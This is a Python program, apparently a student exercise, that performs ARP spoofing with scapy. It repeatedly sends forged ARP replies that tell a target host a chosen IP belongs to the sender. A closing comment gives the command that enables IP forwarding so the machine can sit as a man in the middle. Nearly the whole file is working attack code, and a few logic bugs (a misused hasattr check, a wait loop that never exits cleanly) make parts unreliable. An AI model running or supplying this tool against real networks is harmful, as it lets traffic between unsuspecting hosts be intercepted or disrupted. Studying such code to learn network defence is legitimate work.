'''
A program that performs ARP Spoofing

Author: Bharath Vignesh J K(19PW08)
'''
import time
import sys

from threading import Thread

from scapy.layers.l2 import ARP
from scapy.sendrecv import send


class ARPSpoofer:
    '''Class that represents the ARP Spoofer'''

    def __init__(self, dst: str):
        self.dst = dst
        self.__alive = True
        self.__threads = {}
                
    @staticmethod
    def __generate_packet(dst_ip, spoof_ip, hwsrc=None):
        '''Generates the ARP packet. IP Addresses and src mac addresses are randomized.'''
        if hwsrc:
            return ARP(op=2, pdst=dst_ip, psrc=spoof_ip, hwsrc=hwsrc)
        else:
            return ARP(op=2, pdst=dst_ip, psrc=spoof_ip)
         
    def spam_request(self, spoof_ip, *, hwsrc=None, time_interval, max_time=100):
        '''The spammer function that sends the generated packets in intervals'''
        start_time = time.time()
        while time.time() - start_time < max_time:
            if hwsrc:
                pkt = self.__generate_packet(self.dst, spoof_ip, hwsrc)
            else:
                pkt = self.__generate_packet(self.dst, spoof_ip)
            print(pkt.summary())
            send(pkt, verbose=False)
            time.sleep(time_interval)
        
    def generate_spoof_msgs(self, spoof_ip, *, hwsrc=None, time_interval=10):
        '''function that generated the threads with the spammer function and starts them'''
        if not hasattr(self.__threads, str((spoof_ip, hwsrc))):
            thread = Thread(target=self.spam_request, args=(spoof_ip,), kwargs={'hwsrc': hwsrc, 'time_interval': time_interval}, daemon=True)
            thread.start()
            self.__threads[(spoof_ip, hwsrc)] = thread
            return True
        return False                    
        
    def wait_till_death(self):
        '''A blocking function that blocks until all the threads die'''
        try:
            while True:
                for thread in self.__threads:
                    if not self.__threads[thread].is_alive() or not self.__alive:
                        break
            self.__alive = False
        except KeyboardInterrupt:
            pass

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('ERROR: No destination to send to.')
    if len(sys.argv) < 3:
        print('ERROR: No IP to spoof.')
    
    else:
        print(f'Press Ctrl + C To Terminate\nDestination: {sys.argv[1]}\nSpoofing: {sys.argv[2]}')

        try:
            pg = ARPSpoofer(sys.argv[1])
            pg.generate_spoof_msgs(sys.argv[2])    
            pg.wait_till_death()
        except PermissionError:
            print('ERROR: Please run it as root user.')

# Run "sudo sysctl net.ipv4.ip_forward=1" to auto forward packets(to act as mitm)

# Reason for preference:
# Using scapy to capture pacets and retransmitting them causes packet loss under heavy loads
